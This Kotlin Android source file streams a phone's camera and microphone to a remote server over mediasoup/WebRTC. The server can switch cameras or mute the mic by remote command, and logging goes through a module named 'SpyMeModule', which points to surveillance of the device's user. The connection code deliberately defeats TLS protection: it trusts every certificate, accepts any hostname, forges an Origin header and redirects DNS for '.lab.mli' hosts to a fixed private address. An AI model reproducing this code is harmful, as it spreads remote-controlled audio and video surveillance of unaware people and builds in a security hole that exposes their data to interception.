package com.anonymous.scure_beat

import android.content.Context
import android.util.Log
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject
import java.net.URISyntaxException
import org.mediasoup.droid.SendTransport
import org.mediasoup.droid.Producer
import org.webrtc.Camera2Enumerator
import org.webrtc.EglBase
import org.webrtc.PeerConnectionFactory
import org.webrtc.SurfaceTextureHelper
import org.webrtc.DefaultVideoDecoderFactory
import org.webrtc.DefaultVideoEncoderFactory
import org.webrtc.AudioSource
import org.webrtc.AudioTrack
import org.webrtc.MediaConstraints
import org.webrtc.VideoCapturer
import org.webrtc.CameraVideoCapturer
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

class MediasoupManager(private val context: Context) {

    private val TAG = "MediasoupManager"
    private var socket: Socket? = null

    private var device: org.mediasoup.droid.Device? = null
    private var sendTransport: SendTransport? = null
    
    private var videoProducer: Producer? = null
    private var audioProducer: Producer? = null
    
    private var peerConnectionFactory: PeerConnectionFactory? = null
    private var eglBaseContext: org.webrtc.EglBase.Context? = null
    private var surfaceTextureHelper: SurfaceTextureHelper? = null
    private var videoCapturer: CameraVideoCapturer? = null
    private var videoTrack: org.webrtc.VideoTrack? = null
    private var audioTrack: org.webrtc.AudioTrack? = null
    private var videoSource: org.webrtc.VideoSource? = null

    private var currentRoomId: String = ""
    
    enum class CameraState { FRONT, BACK, OFF }
    private var currentCameraState = CameraState.FRONT
    private var isMicMuted = false

    private val sendTransportListener = object : SendTransport.Listener {
        override fun onConnect(transport: org.mediasoup.droid.Transport, dtlsParameters: String) {
            Log.e(TAG, "sendTransportListener::onConnect")
            val payload = JSONObject().apply {
                put("transportId", transport.id)
                put("dtlsParameters", JSONObject(dtlsParameters))
            }
            socket?.emit("connectTransport", payload)
        }

        override fun onProduce(
            transport: org.mediasoup.droid.Transport,
            kind: String,
            rtpParameters: String,
            appData: String?
        ): String {
            val msg1 = "sendTransportListener::onProduce kind=$kind"
            Log.e(TAG, msg1)
            SpyMeModule.emitLog(msg1)
            var producerId = ""
            val latch = CountDownLatch(1)
            val payload = JSONObject().apply {
                put("transportId", transport.id)
                put("kind", kind)
                put("rtpParameters", JSONObject(rtpParameters))
                put("source", if(kind == "audio") "mic" else "camera")
            }
            socket?.emit("produce", payload, io.socket.client.Ack { args ->
                val response = args[0] as? JSONObject
                if (response != null) {
                    if (response.has("producerId")) {
                        producerId = response.getString("producerId")
                    } else if (response.has("id")) {
                        producerId = response.getString("id")
                    }
                }
                latch.countDown()
            })
            latch.await(5, TimeUnit.SECONDS)
            val msg2 = "Server returned producerId: $producerId for $kind"
            Log.e(TAG, msg2)
            SpyMeModule.emitLog(msg2)
            return producerId
        }

        override fun onProduceData(
            transport: org.mediasoup.droid.Transport,
            sctpStreamParameters: String,
            label: String,
            protocol: String,
            appData: String?
        ): String {
            return ""
        }

        override fun onConnectionStateChange(transport: org.mediasoup.droid.Transport, connectionState: String) {
            Log.e(TAG, "sendTransport connection state: $connectionState")
        }
    }

    fun connect(roomId: String, token: String, username: String, backendUrl: String, wsUrl: String, iceServers: String) {
        currentRoomId = roomId
        try {
            org.mediasoup.droid.MediasoupClient.initialize(context.applicationContext)
            
            val options = IO.Options()
            options.reconnection = true
            options.forceNew = true
            
            try {
                val trustAllCerts = arrayOf<javax.net.ssl.TrustManager>(object : javax.net.ssl.X509TrustManager {
                    override fun checkClientTrusted(chain: Array<java.security.cert.X509Certificate>, authType: String) {}
                    override fun checkServerTrusted(chain: Array<java.security.cert.X509Certificate>, authType: String) {}
                    override fun getAcceptedIssuers(): Array<java.security.cert.X509Certificate> = arrayOf()
                })
                val sslContext = javax.net.ssl.SSLContext.getInstance("TLS")
                sslContext.init(null, trustAllCerts, java.security.SecureRandom())
                val okHttpClient = okhttp3.OkHttpClient.Builder()
                    .addInterceptor { chain ->
                        val request = chain.request().newBuilder()
                            .addHeader("Origin", "https://status.lab.mli")
                            .build()
                        chain.proceed(request)
                    }
                    .hostnameVerifier { _, _ -> true }
                    .sslSocketFactory(sslContext.socketFactory, trustAllCerts[0] as javax.net.ssl.X509TrustManager)
                    .dns(object : okhttp3.Dns {
                        override fun lookup(hostname: String): List<java.net.InetAddress> {
                            return if (hostname.endsWith(".lab.mli")) {
                                listOf(java.net.InetAddress.getByName("192.168.100.9"))
                            } else {
                                okhttp3.Dns.SYSTEM.lookup(hostname)
                            }
                        }
                    })
                    .build()
                options.callFactory = okHttpClient
                options.webSocketFactory = okHttpClient
            } catch (e: Exception) {
                Log.e(TAG, "Failed to bypass SSL", e)
            }

            if (token.isNotEmpty()) {
                options.auth = mapOf("token" to token)
            }

            val socketUrl = wsUrl.replace("wss://", "https://").replace("ws://", "http://")
            socket = IO.socket(socketUrl, options)

            socket?.on(Socket.EVENT_CONNECT) {
                SpyMeModule.emitLog("Socket connected: ${socket?.id()}")
                val joinPayload = JSONObject().apply {
                    put("roomId", roomId)
                    put("clientName", username)
                }
                socket?.emit("joinRoom", joinPayload)
                fetchRouterCapabilities()
            }

            socket?.on(Socket.EVENT_DISCONNECT) {
                Log.e(TAG, "Socket disconnected")
            }
            
            socket?.on("toggleCamera") {
                SpyMeModule.emitLog("Received toggleCamera command")
                cycleCamera()
            }
            
            socket?.on("toggleMic") {
                SpyMeModule.emitLog("Received toggleMic command")
                toggleMic()
            }

            socket?.connect()
        } catch (e: Exception) {
            Log.e(TAG, "Socket connection failed", e)
        }
    }

    private fun cycleCamera() {
        if (peerConnectionFactory == null || videoCapturer == null || videoSource == null) return
        val enumerator = Camera2Enumerator(context)
        
        when (currentCameraState) {
            CameraState.FRONT -> {
                // Switch to Back
                SpyMeModule.emitLog("Switching to BACK camera")
                var backCam: String? = null
                for (name in enumerator.deviceNames) {
                    if (enumerator.isBackFacing(name)) {
                        backCam = name
                        break
                    }
                }
                if (backCam != null) {
                    videoCapturer?.switchCamera(null)
                    currentCameraState = CameraState.BACK
                }
            }
            CameraState.BACK -> {
                // Switch to OFF
                SpyMeModule.emitLog("Switching camera OFF")
                try {
                    videoCapturer?.stopCapture()
                } catch(e: Exception) {}
                videoTrack?.setEnabled(false)
                videoProducer?.pause()
                currentCameraState = CameraState.OFF
            }
            CameraState.OFF -> {
                // Switch to FRONT
                SpyMeModule.emitLog("Switching to FRONT camera")
                var frontCam: String? = null
                for (name in enumerator.deviceNames) {
                    if (enumerator.isFrontFacing(name)) {
                        frontCam = name
                        break
                    }
                }
                if (frontCam != null) {
                    videoTrack?.setEnabled(true)
                    videoProducer?.resume()
                    try {
                        videoCapturer?.startCapture(640, 480, 30)
                    } catch(e: Exception) {}
                    // might need to re-create capturer if stopCapture killed it, 
                    // but usually startCapture works on the existing instance if surfaceTextureHelper is alive.
                    currentCameraState = CameraState.FRONT
                }
            }
        }
    }

    private fun toggleMic() {
        if (audioTrack != null) {
            isMicMuted = !isMicMuted
            audioTrack?.setEnabled(!isMicMuted)
            if (isMicMuted) {
                audioProducer?.pause()
                SpyMeModule.emitLog("Microphone MUTED")
            } else {
                audioProducer?.resume()
                SpyMeModule.emitLog("Microphone UNMUTED")
            }
        }
    }

    private fun fetchRouterCapabilities() {
        socket?.emit("getRouterRtpCapabilities", io.socket.client.Ack { args ->
            if (args.isNotEmpty()) {
                val rtpCapabilities = args[0] as? JSONObject
                try {
                    device = org.mediasoup.droid.Device()
                    device?.load(rtpCapabilities.toString(), null)
                    createSendTransport()
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to load Mediasoup Device", e)
                }
            }
        })
    }

    private fun createSendTransport() {
        val payload = JSONObject().apply { put("roomId", currentRoomId) }
        socket?.emit("createSendTransport", payload, io.socket.client.Ack { args ->
            val response = args[0] as? JSONObject
            if (response != null && !response.has("error")) {
                try {
                    val id = response.getString("id")
                    val iceParameters = response.getJSONObject("iceParameters").toString()
                    val iceCandidates = response.getJSONArray("iceCandidates").toString()
                    val dtlsParameters = response.getJSONObject("dtlsParameters").toString()

                    sendTransport = device?.createSendTransport(
                        sendTransportListener, id, iceParameters, iceCandidates, dtlsParameters
                    )
                    startMediaProducers()
                } catch (e: Exception) {
                    Log.e(TAG, "Error initializing sendTransport", e)
                }
            }
        })
    }

    private fun startMediaProducers() {
        SpyMeModule.emitLog("Initializing local camera and mic...")
        try {
            val eglBase = EglBase.create()
            eglBaseContext = eglBase.eglBaseContext
            PeerConnectionFactory.initialize(
                PeerConnectionFactory.InitializationOptions.builder(context).createInitializationOptions()
            )
            val options = PeerConnectionFactory.Options()
            val encoderFactory = DefaultVideoEncoderFactory(eglBaseContext, true, true)
            val decoderFactory = DefaultVideoDecoderFactory(eglBaseContext)
            
            peerConnectionFactory = PeerConnectionFactory.builder()
                .setOptions(options)
                .setVideoEncoderFactory(encoderFactory)
                .setVideoDecoderFactory(decoderFactory)
                .createPeerConnectionFactory()

            val enumerator = Camera2Enumerator(context)
            var deviceName: String? = null
            for (name in enumerator.deviceNames) {
                if (enumerator.isFrontFacing(name)) {
                    deviceName = name
                    break
                }
            }
            if (deviceName == null) {
                for (name in enumerator.deviceNames) {
                    if (enumerator.isBackFacing(name)) {
                        deviceName = name
                        break
                    }
                }
            }

            // Audio
            val audioConstraints = MediaConstraints()
            audioConstraints.mandatory.add(MediaConstraints.KeyValuePair("googEchoCancellation", "true"))
            audioConstraints.mandatory.add(MediaConstraints.KeyValuePair("googAutoGainControl", "true"))
            audioConstraints.mandatory.add(MediaConstraints.KeyValuePair("googNoiseSuppression", "true"))
            val audioSource = peerConnectionFactory?.createAudioSource(audioConstraints)
            audioTrack = peerConnectionFactory?.createAudioTrack("audio_track_01", audioSource)
            audioTrack?.setEnabled(true)
            
            val producerListener = object : Producer.Listener {
                override fun onTransportClose(producer: Producer) {}
            }

            audioProducer = sendTransport?.produce(
                producerListener,
                audioTrack,
                null,
                null,
                null
            )
            SpyMeModule.emitLog("Audio Producer created")

            // Video
            if (deviceName != null) {
                videoCapturer = enumerator.createCapturer(deviceName, null) as? CameraVideoCapturer
                surfaceTextureHelper = SurfaceTextureHelper.create("CaptureThread", eglBaseContext)
                videoSource = peerConnectionFactory?.createVideoSource(videoCapturer!!.isScreencast)
                
                videoCapturer?.initialize(surfaceTextureHelper, context, videoSource!!.capturerObserver)
                videoCapturer?.startCapture(640, 480, 30)

                videoTrack = peerConnectionFactory?.createVideoTrack("video_track_01", videoSource)
                videoTrack?.setEnabled(true)
                
                videoProducer = sendTransport?.produce(
                    producerListener,
                    videoTrack,
                    null,
                    null,
                    null
                )
                SpyMeModule.emitLog("Video Producer created")
                currentCameraState = CameraState.FRONT
            }

        } catch (e: Exception) {
            SpyMeModule.emitLog("Failed to start media producers: ${e.message}")
        }
    }

    fun disconnect() {
        socket?.disconnect()
        socket?.off()
        socket = null
        
        try {
            videoCapturer?.stopCapture()
        } catch(e: Exception){}
        
        videoProducer?.close()
        videoProducer = null
        audioProducer?.close()
        audioProducer = null
        sendTransport?.close()
        sendTransport = null
        device?.dispose()
        device = null
    }
}
